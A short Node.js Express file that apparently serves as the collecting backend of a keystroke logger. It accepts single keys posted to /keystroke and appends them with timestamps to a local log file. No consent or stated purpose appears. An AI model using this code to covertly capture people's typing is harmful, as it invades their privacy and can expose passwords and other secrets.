// app.js
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));

// ✅ Ensure logs directory exists
const logFilePath = path.join(__dirname, 'keystrokes.log');
if (!fs.existsSync(logFilePath)) {
  fs.writeFileSync(logFilePath, '');
}

// ✅ Clean and process input
function cleanKeystroke(input) {
  return input
    .replace(/[\x00-\x1F\x7F]/g, '')  // remove control characters
    .replace(/\s+/g, ' ')             // normalize whitespace
    .trim();
}

// ✅ Receive and log keystroke
app.post('/keystroke', (req, res) => {
  const rawInput = req.body.key || '';
  const cleanedInput = cleanKeystroke(rawInput);
  const timestamp = new Date().toISOString();

  if (cleanedInput) {
    const logEntry = `[${timestamp}] ${cleanedInput}\n`;
    fs.appendFile(logFilePath, logEntry, (err) => {
      if (err) {
        console.error('❌ Error writing to log:', err);
      } else {
         console.log('✅ Keystroke logged:', cleanedInput);
      }
    });
  }

  res.sendStatus(200);
});

app.listen(3000, () => {
  console.log('🚀 Listening on http://localhost:3000');
});
